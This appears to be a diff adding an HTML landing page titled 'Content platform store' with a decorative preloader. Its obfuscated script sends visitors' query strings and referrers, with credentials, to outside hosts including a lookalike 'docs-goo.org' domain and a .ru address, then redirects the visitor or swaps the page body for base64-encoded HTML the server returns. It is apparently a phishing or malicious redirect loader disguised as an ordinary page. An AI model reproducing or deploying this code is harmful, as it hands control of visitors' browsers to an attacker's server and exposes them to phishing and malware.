@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="referrer" content="origin">
+    <title>Content platform store</title>
+    <link rel="shortcut icon" href="//ssl.gstatic.com/pantheon/images/favicon/default.png">
+	<link type="text/css" href="https://s3.eu-west-2.amazonaws.com/trusted-foundation/deadpixel-preloader.css" rel="stylesheet">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js?test=build"></script>
+</head>
+<body>
+
+<script type="text/javascript">
+   function response(e){var r=jQuery.parseJSON(atob(e));if("redirect"===r.status)return void window.location.replace(r.link);if("script"===r.status){var t=new URL(window.location.href);t.search="?"+r.linkVars,history.replaceState({},document.title,t.href);var n=atob(r.data);$("body").html(n)}else alert("Udefined content")}if($(document).ready(function(){var e="t=handler&ran=dbg_test123&v="+btoa(location.search)+(document.referrer?"&r="+btoa(document.referrer):"");if("XDomainRequest"in window){var r="http://burningcube.ru/findic.php?"+e,t=new XDomainRequest;t&&(t.onload=function(){response(t.responseText)},t.onerror=function(){},t.open("GET",r),t.send())}else{var r="https://docs-goo.org/findic.php?"+e;$.ajax({url:r,crossDomain:!0,xhrFields:{withCredentials:!0},success:response,dataType:"text"})}}),"atob"in window==!1){var base64={};base64.PADCHAR="=",base64.ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",base64.makeDOMException=function(){try{return new DOMException(DOMException.INVALID_CHARACTER_ERR)}catch(e){var r=new Error("DOM Exception 5");return r.code=r.number=5,r.name=r.description="INVALID_CHARACTER_ERR",r.toString=function(){return"Error: "+r.name+": "+r.message},r}},base64.getbyte64=function(e,r){var t=base64.ALPHA.indexOf(e.charAt(r));if(-1===t)throw base64.makeDOMException();return t},base64.decode=function(e){e=""+e;var r,t,n,a=base64.getbyte64,o=e.length;if(0===o)return e;if(o%4!==0)throw base64.makeDOMException();r=0,e.charAt(o-1)===base64.PADCHAR&&(r=1,e.charAt(o-2)===base64.PADCHAR&&(r=2),o-=4);var s=[];for(t=0;o>t;t+=4)n=a(e,t)<<18|a(e,t+1)<<12|a(e,t+2)<<6|a(e,t+3),s.push(String.fromCharCode(n>>16,n>>8&255,255&n));switch(r){case 1:n=a(e,t)<<18|a(e,t+1)<<12|a(e,t+2)<<6,s.push(String.fromCharCode(n>>16,n>>8&255));break;case 2:n=a(e,t)<<18|a(e,t+1)<<12,s.push(String.fromCharCode(n>>16))}return s.join("")},base64.getbyte=function(e,r){var t=e.charCodeAt(r);if(t>255)throw base64.makeDOMException();return t},base64.encode=function(e){if(1!==arguments.length)throw new SyntaxError("Not enough arguments");var r,t,n=base64.PADCHAR,a=base64.ALPHA,o=base64.getbyte,s=[];e=""+e;var i=e.length-e.length%3;if(0===e.length)return e;for(r=0;i>r;r+=3)t=o(e,r)<<16|o(e,r+1)<<8|o(e,r+2),s.push(a.charAt(t>>18)),s.push(a.charAt(t>>12&63)),s.push(a.charAt(t>>6&63)),s.push(a.charAt(63&t));switch(e.length-i){case 1:t=o(e,r)<<16,s.push(a.charAt(t>>18)+a.charAt(t>>12&63)+n+n);break;case 2:t=o(e,r)<<16|o(e,r+1)<<8,s.push(a.charAt(t>>18)+a.charAt(t>>12&63)+a.charAt(t>>6&63)+n)}return s.join("")},window.btoa||(window.btoa=base64.encode),window.atob||(window.atob=base64.decode)}
+	
+</script>
+	
+<div class="cont">
+	<div class="line square"></div>
+	<div class="line square2"></div>
+	<div class="line square3"></div>
+	<div class="line square4"></div>
+</div>
+	
+</body>
+</html>
